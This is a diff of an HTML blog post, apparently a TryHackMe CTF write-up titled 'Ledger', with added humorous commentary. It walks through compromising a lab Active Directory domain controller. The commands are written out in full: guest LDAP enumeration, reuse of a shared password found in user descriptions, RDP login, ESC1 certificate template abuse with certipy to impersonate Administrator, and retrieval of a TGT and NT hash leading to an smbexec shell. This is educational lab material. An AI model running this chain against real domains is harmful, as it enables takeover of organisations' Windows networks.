@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>Ledger | Jenn Shagrin</title>
-<meta name="description" content="TryHackMe CTF — Active Directory with certificate services. Guest LDAP enumeration, shared password, RDP, ESC1 certificate template abuse via certipy, TGT retrieval, smbexec shell as Administrator.">
+<meta name="description" content="TryHackMe CTF — Active Directory with certificate services. Guest LDAP enumeration, shared password discovery, RDP, ESC1 cert abuse via certipy, Administrator TGT, smbexec shell.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/ledger-ctf.html">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
@@ -70,12 +70,12 @@
 <meta property="og:url" content="https://jennshaggy.github.io/ledger-ctf.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Ledger">
-<meta property="og:description" content="Guest LDAP enumeration, shared password, RDP, ESC1 certificate abuse via certipy, TGT retrieval, smbexec shell as Administrator.">
+<meta property="og:description" content="Active Directory with certificate services. Guest LDAP enumeration, shared password, ESC1 cert abuse, Administrator TGT, smbexec shell.">
 <meta property="og:locale" content="en-us">
 <meta property="og:type" content="article">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Ledger">
-<meta name="twitter:description" content="Guest LDAP enumeration, shared password, RDP, ESC1 certificate abuse via certipy, TGT retrieval, smbexec shell as Administrator.">
+<meta name="twitter:description" content="Active Directory with certificate services. Guest LDAP enumeration, shared password, ESC1 cert abuse, Administrator TGT, smbexec shell.">
 </head>
 
 <body id="top">
@@ -145,12 +145,12 @@
 <article class="post-single">
   <header class="post-header">
     <h1 class="post-title entry-hint-parent">Ledger</h1>
-    <div class="post-description">TryHackMe CTF &mdash; Active Directory with certificate services. Guest LDAP enumeration, shared password discovery, RDP as Susanna, ESC1 abuse via certipy, Administrator certificate, TGT retrieval, smbexec shell.</div>
+    <div class="post-description">TryHackMe CTF &mdash; Active Directory with certificate services. The domain controller handed over the keys before I even knocked hard.</div>
   </header>
 
   <div class="post-content">
 
-<p>Active Directory with certificate services. The domain controller handed over the keys before I even knocked hard.</p>
+<p>This challenge simulates a real cyber-attack scenario where you exploit an Active Directory environment. Hostname: <code>LABYRINTH</code>. Domain: <code>thm.local</code>. That CA name from Operation Endgame was back — <code>thm-LABYRINTH-CA</code>. Already knew what that meant.</p>
 
 <hr>
 
@@ -158,95 +158,106 @@
 
 <pre><code>nmap -T4 -n -sC -sV -Pn -p- 10.145.166.252</code></pre>
 
-<p>Port scan confirmed a domain controller. Hostname: <code>LABYRINTH</code>. Updated <code>/etc/hosts</code>:</p>
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 7.43.42 AM.png" alt="nmap scan confirming domain controller port cluster" style="max-width:100%;margin:1rem 0;">
 
-<pre><code>[target IP] labyrinth.thm.local thm.local</code></pre>
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 7.44.16 AM.png" alt="Full port results — LABYRINTH hostname, thm.local domain, certificate services present" style="max-width:100%;margin:1rem 0;">
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 7.43.42 AM.png" alt="nmap scan showing domain controller ports and certificate services" style="max-width:100%;margin:1rem 0;">
-
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 7.44.16 AM.png" alt="nmap full port results — LABYRINTH hostname, thm.local domain confirmed" style="max-width:100%;margin:1rem 0;">
+<p>That is a whole lot of easy access, Microsoft. Updated <code>/etc/hosts</code> with both <code>labyrinth.thm.local</code> and <code>thm.local</code> and moved on.</p>
 
 <hr>
 
-<h2>Guest Access</h2>
+<h2>Guest Access &mdash; LDAP Enumeration</h2>
 
-<p>netexec confirmed guest access over SMB without credentials:</p>
+<p>NetExec did a beautiful job on the last AD breach. Let's tango.</p>
 
 <pre><code>nxc smb labyrinth.thm.local -u 'guest' -p ''</code></pre>
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.00.55 AM.png" alt="netexec SMB guest auth — Null Auth:True confirmed" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.00.55 AM.png" alt="NetExec guest SMB auth — Null Auth: True" style="max-width:100%;margin:1rem 0;">
 
-<p>From there, LDAP enumeration with the same guest account returned a full user list — including two users sharing a password. Ivy and Suzanna, password besties.</p>
+<p>Be your guest? Well, if you insist.</p>
 
 <pre><code>nxc ldap labyrinth.thm.local -u 'guest' -p '' --users</code></pre>
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.02.59 AM.png" alt="LDAP enumeration returning 487 domain users" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.02.59 AM.png" alt="LDAP enumeration returning full domain user list" style="max-width:100%;margin:1rem 0;">
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.06.32 AM.png" alt="User list showing IVY_WILLIS and SUSANNA_MCKNIGHT with CHANGEME2023! in description" style="max-width:100%;margin:1rem 0;">
+<p>Ivy, Suzanna — come on, ladies. Cyber hygiene is more important than being password besties.</p>
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.11.01 AM.png" alt="netexec confirming CHANGEME2023! valid for both IVY_WILLIS and SUSANNA_MCKNIGHT" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.06.32 AM.png" alt="IVY_WILLIS and SUSANNA_MCKNIGHT both showing CHANGEME2023! in description field" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.11.01 AM.png" alt="NetExec confirming CHANGEME2023! valid for both accounts" style="max-width:100%;margin:1rem 0;">
+
+<p>I unfortunately have to pwn both of you. At least I hope this helps you learn a valuable lesson.</p>
 
 <hr>
 
-<h2>Initial Access</h2>
+<h2>Initial Access &mdash; RDP as Suzanna</h2>
 
-<p>RDP into Suzanna's account:</p>
+<p>Let's drop in on Suzanna first. Just a hunch.</p>
 
 <pre><code>xfreerdp /v:labyrinth.thm.local /u:'SUSANNA_MCKNIGHT' /p:'CHANGEME2023!' /dynamic-resolution /clipboard /cert:ignore</code></pre>
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.14.11 AM.png" alt="FreeRDP session open as SUSANNA_MCKNIGHT — user.txt visible on desktop" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.14.11 AM.png" alt="xfreerdp session open as SUSANNA_MCKNIGHT" style="max-width:100%;margin:1rem 0;">
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.14.43 AM.png" alt="user.txt opened — THM{ENUMERATION_IS_THE_KEY}" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.14.43 AM.png" alt="Suzanna's desktop — certificate vulnerability hints visible, user.txt present" style="max-width:100%;margin:1rem 0;">
 
-<p>Her desktop confirmed the next move — certificate vulnerabilities were on display.</p>
+<p>Well, Suzanna, I was wrong. You hold the key to a Microsoft vision quest. From what's visible on her desktop, certificate vulnerabilities are being hinted at directly.</p>
 
 <hr>
 
-<h2>Certificate Abuse (ESC1)</h2>
-
-<p>certipy identified three vulnerabilities on the ServerAuth template. The critical one: Client Authentication EKU with a modifiable Subject. Enrollment rights open to all authenticated users.</p>
+<h2>Certificate Abuse &mdash; ESC1</h2>
 
 <pre><code>certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target labyrinth.thm.local -stdout -vulnerable</code></pre>
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.20.53 AM.png" alt="certipy find output — ESC1 on ServerAuth template, CA thm-LABYRINTH-CA" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.20.53 AM.png" alt="certipy find — ESC1 vulnerability on ServerAuth template" style="max-width:100%;margin:1rem 0;">
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.21.16 AM.png" alt="certipy detail — EnrolleeSuppliesSubject:True, Authenticated Users can enroll, ESC1 confirmed" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.21.16 AM.png" alt="ESC1 detail — EnrolleeSuppliesSubject: True, Authenticated Users enrollment rights" style="max-width:100%;margin:1rem 0;">
 
-<p>Requested a certificate as Administrator:</p>
+<p>Hot damn. Caught red-handed. Three major vulnerabilities. The critical one: Client Authentication EKU with a modifiable Subject. Enrollment rights open to all authenticated users. We can modify the Subject and impersonate whichever account we want.</p>
+
+<p>Let's certipy again, this time as an RPG character on a vision quest with Suzanna as our unwitting guide:</p>
 
 <pre><code>certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local</code></pre>
 
+<p>This should not be so easy.</p>
+
 <img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.28.44 AM.png" alt="certipy req — certificate issued as Administrator@thm.local, saved to administrator.pfx" style="max-width:100%;margin:1rem 0;">
+
+<p>But it is.</p>
 
 <hr>
 
 <h2>Shell</h2>
 
-<p>Synced timezone to the target (required for Kerberos):</p>
+<p>Synced timezone to the target first — required for Kerberos:</p>
 
 <pre><code>sudo timedatectl set-timezone Etc/GMT</code></pre>
 
-<p>Authenticated with the certificate to retrieve a TGT and NT hash:</p>
+<p>Authenticated with the certificate to retrieve a TGT and NT hash. Let's smoke some hash.</p>
 
 <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.145.166.252 -domain thm.local</code></pre>
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.45.30 AM.png" alt="certipy auth — TGT retrieved, NT hash for administrator@thm.local obtained" style="max-width:100%;margin:1rem 0;">
+<pre><code>[*] Got TGT
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322</code></pre>
 
-<p>Set the Kerberos credential cache and dropped into a shell:</p>
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 8.45.30 AM.png" alt="certipy auth — TGT retrieved, NT hash for administrator obtained" style="max-width:100%;margin:1rem 0;">
 
 <pre><code>export KRB5CCNAME=~/administrator.ccache
 smbexec.py -k -no-pass THM.LOCAL/Administrator@labyrinth.thm.local</code></pre>
 
-<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 9.07.10 AM.png" alt="smbexec shell landed as Administrator — C:\Windows\system32>" style="max-width:100%;margin:1rem 0;">
+<img src="/images/ledger-ctf/Screenshot 2026-04-09 at 9.07.10 AM.png" alt="smbexec shell landed as Administrator" style="max-width:100%;margin:1rem 0;">
 
-<p>From here, I won't spoil the treasure hunt. Find your way to <code>root.txt</code>. Please, Suzanna. Change your password.</p>
+<p>From here, I won't spoil the treasure hunt. Find your way to <code>root.txt</code>, and fin.</p>
+
+<p>Thanks again, Suzanna. Please change your password.</p>
 
 <hr>
 
 <h2>Full Attack Chain</h2>
 
-<pre><code>guest SMB access → LDAP user enumeration → shared password → RDP as Susanna
-→ ESC1 cert abuse → Administrator certificate → TGT → shell</code></pre>
+<pre><code>guest SMB → LDAP enumeration → shared password (CHANGEME2023!)
+→ RDP as SUSANNA_MCKNIGHT → ESC1 cert abuse via certipy
+→ Administrator certificate → TGT + NT hash → smbexec shell</code></pre>
 
   </div>
   <footer class="post-footer"></footer>
